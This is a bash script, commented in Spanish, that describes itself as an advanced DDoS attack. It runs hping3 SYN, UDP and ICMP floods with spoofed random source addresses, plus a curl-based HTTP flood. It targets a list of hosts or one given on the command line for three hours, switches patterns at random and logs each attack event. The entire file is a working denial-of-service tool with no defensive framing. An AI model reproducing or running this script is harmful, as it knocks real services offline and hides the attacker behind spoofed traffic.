#!/bin/bash
# Ataque DDoS avanzado con registro de eventos de ataque

ATTACK_LOG="ddos_attacks.log"  # Archivo para registrar ataques
TARGETS=("10.1.1.5" "10.1.1.7" "10.1.1.9" "10.1.1.11" "10.1.1.13")  # Hosts servidores
DURATION=10800  # Duración total del ataque en segundos
INTERVAL=5   # Intervalo entre cambios de patrón

# Función para registrar ataques
function log_attack {
    echo "$(date +%s)|$1|$2" >> $ATTACK_LOG
}

# Configuración de tipos de ataque
ATTACK_TYPES=("SYN" "UDP" "ICMP" "HTTP") 
CURRENT_ATTACK=${2:-"SYN"}  # Usar el tipo especificado o SYN por defecto

# Inicializar archivo de log
echo "=== Registro de ataques DDoS ===" > $ATTACK_LOG

# Registrar inicio de ataque
log_attack "START" "${1:-"multiple"}"

function cleanup {
    # Registrar fin de ataque
    log_attack "END" "${1:-"multiple"}"
    exit 0
}

trap cleanup EXIT

function change_attack_pattern {
    # Cambia aleatoriamente el patrón de ataque
    CURRENT_ATTACK=${ATTACK_TYPES[$RANDOM % ${#ATTACK_TYPES[@]}]}
    echo "[$(date +'%T')] Cambiando a patrón de ataque: $CURRENT_ATTACK"
    log_attack "CHANGE" "$CURRENT_ATTACK"
}

function launch_syn_flood {
    target=$1
    hping3 --rand-source -S -q -p 80 --flood -d 64 --faster $target &
    PID=$!
    sleep $((INTERVAL + RANDOM % 10))
    kill -9 $PID 2>/dev/null
}

function launch_udp_flood {
    target=$1
    hping3 -2 --rand-source -q -p 53 --flood -d 1024 --faster $target &
    PID=$!
    sleep $((INTERVAL - 5 + RANDOM % 8))
    kill -9 $PID 2>/dev/null
}

function launch_icmp_flood {
    target=$1
    hping3 -1 --rand-source -q --flood -d 64 --faster $target &
    PID=$!
    sleep $((INTERVAL + RANDOM % 5))
    kill -9 $PID 2>/dev/null
}

function launch_http_flood {
    target=$1
    for i in {1..500}; do
        curl --connect-timeout 1 -s "http://$target" >/dev/null &
        sleep 0.01
    done
    sleep $INTERVAL
}

function attack_cycle {
    target=$1
    case $CURRENT_ATTACK in
        "SYN")
            launch_syn_flood $target
            ;;
        "UDP")
            launch_udp_flood $target
            ;;
        "ICMP")
            launch_icmp_flood $target
            ;;
        "HTTP")
            launch_http_flood $target
            ;;
    esac
}

# Verificar si se especificó un target
if [ $# -ge 1 ]; then
    TARGETS=($1)
fi

echo "=============================================="
echo " INICIANDO ATAQUE DDoS AVANZADO"
echo " Tipo: $CURRENT_ATTACK"
echo " Targets: ${TARGETS[@]}"
echo " Duración: $DURATION segundos"
echo " Intervalo de cambio: $INTERVAL segundos"
echo "=============================================="

# Iniciar temporizador
start_time=$(date +%s)
end_time=$((start_time + DURATION))

# Bucle principal de ataque
while [ $(date +%s) -lt $end_time ]; do
    # Seleccionar target aleatorio
    target=${TARGETS[$RANDOM % ${#TARGETS[@]}]}
    
    # Cambiar patrón periódicamente (solo si no se especificó tipo)
    if [ $# -lt 2 ] && [ $((RANDOM % 4)) -eq 0 ]; then
        change_attack_pattern
    fi
    
    # Ejecutar ciclo de ataque
    echo "[$(date +'%T')] Atacando $target con $CURRENT_ATTACK"
    attack_cycle $target
    
    # Pequeña pausa entre ciclos
    sleep 1
done

echo "=============================================="
echo " ATAQUE FINALIZADO"
echo "=============================================="

# Limpiar procesos residuales
pkill -9 hping3 2>/dev/null
pkill -9 curl 2>/dev/null